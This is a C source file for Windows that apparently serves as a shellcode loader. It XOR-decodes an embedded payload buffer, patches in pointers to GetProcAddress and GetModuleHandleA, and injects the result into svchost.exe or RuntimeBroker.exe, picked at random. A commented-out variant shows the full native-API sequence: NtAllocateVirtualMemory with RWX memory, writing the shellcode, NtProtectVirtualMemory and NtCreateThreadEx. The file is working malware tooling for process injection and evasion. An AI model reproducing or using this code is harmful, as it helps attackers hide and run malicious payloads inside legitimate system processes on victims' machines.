#include <time.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "patch.h"


char data[DATA_SIZE] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void* buffer) {
	phear* payload = (phear*)data;

	if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0) {
		return;
	}

	void* gpa_addr = (void*)GetProcAddress;
	void* gmh_addr = (void*)GetModuleHandleA;

	memcpy((char*)buffer + payload->gmh_offset, &gmh_addr, sizeof(void*));
	memcpy((char*)buffer + payload->gpa_offset, &gpa_addr, sizeof(void*));
}




void spawn(void* buffer, int length, char* key) {
	int x;
	for (x = 0; x < length; x++) {
		*((char*)buffer + x) = *((char*)buffer + x) ^ key[x % 4];
	}

	set_key_pointers(buffer);
	char processname[100];
	int r;
	srand(time(NULL));
	r = rand();

	if (r % 2 == 0) {
		strcpy(processname, "svchost.exe");
	}

	else {
		strcpy(processname, "RuntimeBroker.exe");
	}

	if (processname == NULL) {
		printf("[!] Taget process is NULL \n");
	}
	printf("[+] Taget process : %s \n", processname);

	inject(buffer, length, processname);
}


/*
void spawn(void* buffer, int length, char* key) {
	
	
	int tpid = GetCurrentProcessId();
	
	printf("[+] targetting process with pid : %d \n",tpid);
	printf("[+] Running OpenProcess ....");
	HANDLE hProc = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		tpid
	); 
	//GetCurrentProcess();
	
	printf(" [ + ] DONE \n");

	HANDLE thandle = NULL;
	PVOID shellcode_addr = NULL;
	DWORD old_protect;
	unsigned long long int shellcode_length = (unsigned long long int)length;
	// allocate the memory for our decoded payload 
	printf("[+] Running NtAllocateVirtualMemory ....");
	NTSTATUS NTAVM = NtAllocateVirtualMemory(hProc, &shellcode_addr, 0, &shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf(" [ + ] DONE \n");


	if (NTAVM == NULL){
		printf("[!] NTAVM is NULL [!] \n");
	}

	printf("[+] Injecting the shellcode....");
	//shellcode_addr = VirtualAlloc(0, shellcode_length, MEM_COMMIT, PAGE_READWRITE);
	int x;
	for (x = 0; x < shellcode_length; x++) {
		char temp = *((char*)buffer + x) ^ key[x % 4];
		*((char*)shellcode_addr + x) = temp;
		printf("[+] Byte 0x%X wrote sucessfully at 0x%p\n", temp, LPVOID((ULONG_PTR)shellcode_addr + x));

	}
	printf(" [ + ] DONE \n");

	printf("[+] Running set_key_pointers ....");
	// propagate our key function pointers to our payload 
	set_key_pointers(shellcode_addr);
	printf(" [ + ] DONE \n");

	printf("[+] Running NtProtectVirtualMemory ....");
	NtProtectVirtualMemory(hProc, &shellcode_addr, &shellcode_length, PAGE_EXECUTE_READ, &old_protect);
	printf(" [ + ] DONE \n");

	//VirtualProtect(shellcode_addr, length, PAGE_EXECUTE_READ, &Beacon_Memory_address_flOldProtect);
	printf("[+] Running NtCreateThreadEx ....");
	NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)&run, shellcode_addr, FALSE, 0, 0, 0, NULL);
	printf(" [ + ] DONE \n");

	

	//thandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, shellcode_addr, 0, NULL);
	printf("[+] Running WaitForSingleObject ....");
	WaitForSingleObject(thandle, INFINITE);
}
*/
